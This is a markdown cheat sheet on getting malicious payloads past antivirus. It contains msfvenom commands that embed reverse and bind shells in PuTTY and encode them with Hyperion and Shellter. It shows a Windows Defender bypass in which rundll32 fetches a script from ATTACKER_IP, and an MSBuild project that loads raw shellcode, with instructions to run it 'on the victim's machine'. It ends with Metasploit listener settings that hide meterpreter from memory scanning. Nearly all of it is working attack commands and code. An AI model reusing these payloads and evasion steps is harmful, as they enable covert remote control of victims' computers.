# Bypassing Antivirus Payload Detection

<img width="704" alt="Screen Shot 2021-12-03 at 5 21 54 PM" src="https://user-images.githubusercontent.com/72598486/144680706-d3b91529-e530-4dcf-b0b9-50a0c94413d2.png">


# MSFvenom reverse stageless shells 
```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f exe-only -k -x /root/payloads/putty_x86.exe -o /root/payloads/msfvenom/msfv_reverse_putty_x86.exe - e x86/shikata_ga_nai -i 20 LHOST=192.168.40.128 LPORT=55555 
msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp -f exe-only -k - x /root/payloads/putty_x64.exe -o /root/payloads/msfvenom/msfv_reverse_putty_x64.exe -e x64/xor -i 20 LHOST=192.168.40.128 LPORT=55555 
```
# MSFVenom bind stageless shell 
```
msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f exe-only -k -x /root/payloads/putty_x86.exe -o /root/payloads/msfvenom/msfv_bind_putty_x86.exe -e x86/shikata_ga_nai -i 20 RHOST=0.0.0.0 LPORT=55555 
msfvenom -a x64 --platform windows -p windows/x64/shell_bind_tcp -f exe-only -k -x /root/payloads/putty_x64.exe -o /root/payloads/msfvenom/msfv_bind_putty_x64.exe -e x64/xor -i 20 RHOST=0.0.0.0 LPORT=55555 
```
# Hyperion 2.31 x64 Payload Generating Strings 
```
wine hyperion.exe /root/payloads/msfvenom/msfv_reverse_putty_x64.exe /root/payloads/hyperion/hyperion_reverse_putty_x64.exe 
wine hyperion.exe /root/payloads/msfvenom/msfv_bind_putty_x64.exe /root/payloads/hyperion/hyperion_bind_putty_x64.exe 
```
# Hyperion 2.2 x86 Payload Generating Strings 
```
wine hyperion.exe /root/payloads/msfvenom/msfv_reverse_putty_x86.exe /root/payloads/hyperion/hyperion_reverse_putty_x86.exe 
wine hyperion.exe /root/payloads/msfvenom/msfv_bind_putty_x86.exe /root/payloads/hyperion/hyperion_bind_putty_x86.exe 
```
# MSFVenom RAW Shellter Payload Generating Strings with only x86 supported 
```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f raw -o /root/payloads/shellter/shellter_reverse_x86.raw -e x86/shikata_ga_nai -i 20 LHOST=192.168.40.128 LPORT=55555 
msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f raw -o /root/payloads/shellter/shellter_bind_x86.raw -e x86/shikata_ga_nai -i 20 RHOST=0.0.0.0 LPORT=55555 
```
# Hyperion 2.2 x86 encrypt a Shellter payload 
```
wine hyperion.exe /root/payloads/shellter/shellter_putty_bind_x86.exe /root/payloads/hyperion/hyperion_shellter_bind_putty_x86.exe 
wine hyperion.exe /root/payloads/shellter/shellter_putty_reverse_x86.exe /root/payloads/hyperion/hyperion_shellter_reverse_putty_x86.exe 
```

# VirusTotal and YARA Detection 
<img width="583" alt="Screen Shot 2021-12-03 at 5 22 12 PM" src="https://user-images.githubusercontent.com/72598486/144680778-e92bd81b-7a97-4559-a564-44ba0217cd0f.png">

Source: ```https://sansorg.egnyte.com/dl/Kj3fXQlZ6x```

# Windows Defender Detection Bypass

Currently, Windows Defender detects and prevents TrojanWin32Powessere.G aka "POWERLIKS" type execution that leverages rundll32.exe. Attempts at execution fail
and attackers will get an "Access is denied" error message. However, it can be easily bypassed by passing an extra path traversal when referencing mshtml.

```
C:\>rundll32.exe javascript:"\..\..\mshtml,RunHTMLApplication ";alert(1)
Access is denied.
```

Pass an extra "..\" to the path.

```C:\>rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";alert(666)```

Windows Defender also detects based on the following javascript call using GetObject("script:http://ATTACKER_IP/hi.tmp").
However, that interference can be bypassed by using concatenation when constructing the URL scheme portion of the payload.

```
C:\>rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://ATTACKER_IP/hi.tmp")
Access is denied.
```

# Living Off the Land with MSBuild:

MSBuild.exe is a built-in Windows tool for building and executing C/C++/C# code.

```
user@kali $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.55 LPORT=443 -f csharp > WindowsHelper.cs
```

Insert shellcode into line 46 and output as .csproj file:

```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
			//replace with your own shellcode
		    byte[] shellcode = new byte[] { 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x00,0x00,0x05,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
		      
		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>
```

On the victim's machine:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe WindowsHelper.csproj
```

# Generating Self-Signed Certificates:

Msfvenom randomizes SSL certificates. Such certificates could be detected by signature scanning. You can bypass it by creating your custom SSL certificate.

```
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
```

Create a .pem file:

```
cat priv.key cert.crt > custom.pem
```

Change CipherString=DEFAULT@SECLEVEL=2 in /etc/ssl/openssl.cnf to:

```
CipherString = DEFAULT
```

# Metasploit Listener:

There are some advanced options in the Metasploit multi/handler module that can help you bypass anti-virus. The first of them is the SSL option. When set to true you listener will be using SSL for the connection. You can use created above custom self-signed certificate for this purpose.

```
set payload windows/x64/meterpreter/reverse_http
set SSL true
set HandlerSSLCert /home/RoseSecurity/custom.pem
```

Another very handy option is to turn off autoloading of stdapi which is responsible to load the default commands of the meterpreter. When loaded, it reserves a space in memory to load meterpreter functions. Anti-viruses scan all the process memory for this signature and can detect that as malicious. If you set it to false, the meterpreter will behave like a common connection. After getting the reverse shell, you can load stdapi manually.

```
set AutoLoadStdapi false
```

AutoVerifySession option makes the meterpreter send another connection after establishing the first connection to see if it is alive. It can be detected too.

```
set AutoVerifySession false
```

When you connect to the target, make sure that you load the stdapi to achieve full shell functionality:

```
meterpreter> load stdapi
```

@Karmaz95
